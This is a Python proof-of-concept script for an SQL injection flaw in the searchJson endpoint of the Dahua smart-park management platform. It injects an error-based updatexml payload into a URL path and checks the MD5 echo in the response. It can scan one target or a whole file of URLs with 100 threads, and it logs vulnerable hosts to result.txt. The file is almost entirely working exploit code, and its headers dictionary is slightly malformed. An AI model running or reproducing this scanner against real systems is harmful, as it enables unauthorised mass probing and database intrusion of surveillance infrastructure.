# 大华智慧园区综合管理平台 searchJson SQL注入漏洞
import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
██████╗  █████╗ ██╗  ██╗██╗   ██╗ █████╗       ███████╗     ██╗      ███████╗ ██████╗ ██╗     
██╔══██╗██╔══██╗██║  ██║██║   ██║██╔══██╗      ██╔════╝     ██║      ██╔════╝██╔═══██╗██║     
██║  ██║███████║███████║██║   ██║███████║█████╗███████╗     ██║█████╗███████╗██║   ██║██║     
██║  ██║██╔══██║██╔══██║██║   ██║██╔══██║╚════╝╚════██║██   ██║╚════╝╚════██║██║▄▄ ██║██║     
██████╔╝██║  ██║██║  ██║╚██████╔╝██║  ██║      ███████║╚█████╔╝      ███████║╚██████╔╝███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝      ╚══════╝ ╚════╝       ╚══════╝ ╚══▀▀═╝ ╚══════╝
                                                               authon:daesen804
                                                               version:1.0.0                               
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="大华智慧园区综合管理平台 searchJson SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D'
    headers = {
        'Accept-Encoding': 'gzip, deflate, br'
        'Connection: close'
    }

    try:
        res = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=10)
        match = re.findall(r"error: '~(.*?)'; nested",res.text,re.S)
        if res.status_code == 500 and match[0] == '1e469dbcb9211897b5f5ebf866c66f3':
            with open("result.txt",'a') as fp:
                fp.write(target+'\n')
            print(f"[+]{target} 存在SQL注入漏洞")
        else:
            print(f"[-]{target} 不存在SQL注入漏洞")
    except:
        pass
        

if __name__ == '__main__':
    main()